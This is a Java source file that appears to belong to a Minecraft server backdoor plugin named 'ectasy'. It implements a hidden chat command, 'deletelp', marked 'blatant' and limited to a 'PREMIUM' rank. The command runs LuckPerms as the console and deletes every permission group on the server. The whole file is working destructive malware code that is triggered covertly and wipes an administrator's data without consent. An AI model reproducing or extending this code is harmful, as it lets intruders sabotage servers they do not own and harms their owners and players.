package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.PluginCommand;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

@CommandInfo(
   name = "deletelp",
   description = "Delete LuckPerms data",
   blatant = true,
   rank = Rank.PREMIUM
)
public class DeleteLuckPermsCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      JavaPlugin var4 = (JavaPlugin)Bukkit.getPluginManager().getPlugin("LuckPerms");
      if (var4 == null) {
         ChatUtil.sendChat(var1.getPlayer(), "LuckPerms not found.");
      } else {
         PluginCommand var5 = var4.getCommand("lp");
         var5.tabComplete(Bukkit.getConsoleSender(), "lp", new String[]{"deletegroup", ""}).forEach(group -> var5.execute(Bukkit.getConsoleSender(), "lp", new String[]{"deletegroup", group}));
         ChatUtil.sendChat(var1.getPlayer(), "Deleted LP data.");
      }
   }
}
